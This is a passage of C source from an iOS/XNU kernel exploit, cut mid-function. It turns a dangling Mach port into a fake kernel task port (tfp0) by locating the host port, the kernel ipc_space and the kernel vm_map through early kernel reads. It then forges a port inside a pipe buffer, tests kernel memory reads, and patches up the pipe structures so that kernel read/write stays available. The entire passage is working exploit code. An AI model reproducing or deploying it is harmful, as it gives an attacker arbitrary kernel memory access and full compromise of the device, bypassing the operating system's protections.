    host_msg.msgh_size = sizeof(host_msg);
    host_msg.msgh_remote_port = canary_port;
    host_msg.msgh_local_port = mach_host_self();
    host_msg.msgh_id = 0x12344321;
    
    err = mach_msg(&host_msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   sizeof(host_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        printf("failed to send host message to canary port %s\n", mach_error_string(err));
        //exit(EXIT_FAILURE);
    }
    printf("sent host_msg to canary port, let's find it and locate the host port\n");
    
    uint64_t host_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    printf("host_kmsg: %016llx\n", host_kmsg);
    
    // hexdump the kmsg:
    //for (int i = 0; i < 100; i++) {
    //  uint64_t val = early_rk64(host_kmsg + (i*8));
    //  printf("%016llx: %016llx\n", host_kmsg + (i*8), val);
    //}
    uint64_t host_port_kaddr = early_rk64(host_kmsg + 0xac); // could parse the message to find this rather than hardcode
    
    // do the same thing again to get our task port:
    discard_message(canary_port);
    
    host_msg.msgh_local_port = mach_task_self();
    err = mach_msg(&host_msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   sizeof(host_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        printf("failed to send host message to canary port %s\n", mach_error_string(err));
        //exit(EXIT_FAILURE);
    }
    printf("sent task_msg to canary port, let's find it and locate the host port\n");
    
    uint64_t task_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    printf("task_kmsg: %016llx\n", task_kmsg);
    
    
    uint64_t task_port_kaddr = early_rk64(host_kmsg + 0xac);
    
    printf("our task port is at %016llx\n", task_port_kaddr);
    
    
    
    // now we can copy-paste some code from multi_path:
    // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
    // we can get the ipc_space easily from the host port (receiver field):
    uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    
    printf("ipc_space_kernel: %016llx\n", ipc_space_kernel);
    
    // the kernel vm_map is a little trickier to find
    // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:
    
    // find the start of the zone block containing the host and kernel task pointers:
    
    uint64_t offset = host_port_kaddr & 0xfff;
    uint64_t first_port = 0;
    if ((offset % 0xa8) == 0) {
        printf("host port is on first page\n");
        first_port = host_port_kaddr & ~(0xfff);
    } else if(((offset+0x1000) % 0xa8) == 0) {
        printf("host port is on second page\n");
        first_port = (host_port_kaddr-0x1000) & ~(0xfff);
    } else if(((offset+0x2000) % 0xa8) == 0) {
        printf("host port is on second page\n");
        first_port = (host_port_kaddr-0x2000) & ~(0xfff);
    } else {
        printf("hummm, my assumptions about port allocations are wrong...\n");
    }
    
    printf("first port is at %016llx\n", first_port);
    uint64_t kernel_vm_map = 0;
    for (int i = 0; i < ports_per_zcram; i++) {
        uint64_t early_port_kaddr = first_port + (i*0xa8);
        uint32_t io_bits = early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
        
        if (io_bits != (IO_BITS_ACTIVE | IKOT_TASK)) {
            continue;
        }
        
        // get that port's kobject:
        uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (task_t == 0) {
            printf("weird heap object with NULL kobject\n");
            continue;
        }
        
        // check the pid via the bsd_info:
        uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        if (bsd_info == 0) {
            printf("task doesn't have a bsd info\n");
            continue;
        }
        uint32_t pid = early_rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid != 0) {
            printf("task isn't the kernel task\n");
        }
        
        // found the right task, get the vm_map
        kernel_vm_map = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
        break;
    }
    
    if (kernel_vm_map == 0) {
        printf("unable to find the kernel task map\n");
        return MACH_PORT_NULL;
    }
    
    printf("kernel map:%016llx\n", kernel_vm_map);
    
    // find the address of the dangling port:
    uint64_t task_kaddr = early_rk64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = early_rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = early_rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t target_port_kaddr = early_rk64(is_table + ((target_port >> 8) * sizeof_ipc_entry_t));
    
    printf("dangling port kaddr is: %016llx\n", target_port_kaddr);
    
    // now we have everything to build a fake kernel task port for memory r/w:
    // we know which
    
    int target_port_read_fd = read_ends[replacer_pipe_index];
    int target_port_write_fd = write_ends[replacer_pipe_index];
    
    uint8_t* fake_tfp0_buf = malloc(0xfff);
    read(target_port_read_fd, fake_tfp0_buf, 0xfff);
    
    
    build_fake_task_port(fake_tfp0_buf, target_port_kaddr, 0x4242424243434343, kernel_vm_map, ipc_space_kernel, 0x1234);
    write(target_port_write_fd, fake_tfp0_buf, 0xfff);
    
    mach_port_t fake_tfp0 = target_port;
    printf("hopefully prepared a fake tfp0!\n");
    
    // test it!
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    err = mach_vm_read(fake_tfp0, kernel_vm_map, 0x40, &data_out, &out_size);
    if (err != KERN_SUCCESS) {
        printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
        sleep(3);
        exit(EXIT_FAILURE);
    }
    
    printf("kernel read via second tfp0 port worked?\n");
    printf("0x%016llx\n", *(uint64_t*)data_out);
    printf("0x%016llx\n", *(uint64_t*)(data_out+8));
    printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
    printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
    
    prepare_for_rw_with_fake_tfp0(fake_tfp0);
    
    // can now use {r,w}k_{32,64}
    
    // cleanup:
    
    // clean up the fake canary port entry:
    wk64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t), 0);
    wk64(is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) + 8, 0);
    
    // leak the pipe buffer which replaces the dangling port:
    
    printf("going to try to clear up the pipes now\n");
    
    // finally we have to fix up the pipe's buffer
    // for this we need to find the process fd table:
    // struct proc:
    uint64_t proc_addr = rk64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
    // struct filedesc
    uint64_t filedesc = rk64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    
    // base of ofiles array
    uint64_t ofiles_base = rk64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    
    uint64_t ofiles_offset = ofiles_base + (target_port_read_fd * 8);
    
    // struct fileproc
    uint64_t fileproc = rk64(ofiles_offset);
    
    // struct fileglob
    uint64_t fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    uint64_t pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    
    // clear the inline struct pipebuf
    printf("clearing pipebuf: %llx\n", pipe);
    wk64(pipe + 0x00, 0);
    wk64(pipe + 0x08, 0);
    wk64(pipe + 0x10, 0);
    
    // do the same for the other end:
    ofiles_offset = ofiles_base + (target_port_write_fd * 8);
    
    // struct fileproc
    fileproc = rk64(ofiles_offset);
    
    // struct fileglob
    fileglob = rk64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    
    // struct pipe
    pipe = rk64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    
    printf("clearing pipebuf: %llx\n", pipe);
    wk64(pipe + 0x00, 0);
    wk64(pipe + 0x08, 0);
    wk64(pipe + 0x10, 0);
    
    for (int i = 0; i < total_fds; i++) {
        close(read_ends[i]);
        close(write_ends[i]);
    }
    printf("done!\n");
    
    printf("use the functions in kmem.h to read and write kernel memory\n");
    printf("tfp0 in there will stay alive once this process exits\n");
    printf("keep hold of a send right to it; don't expect this exploit to work again without a reboot\n");
    
    return fake_tfp0;
}

#endif
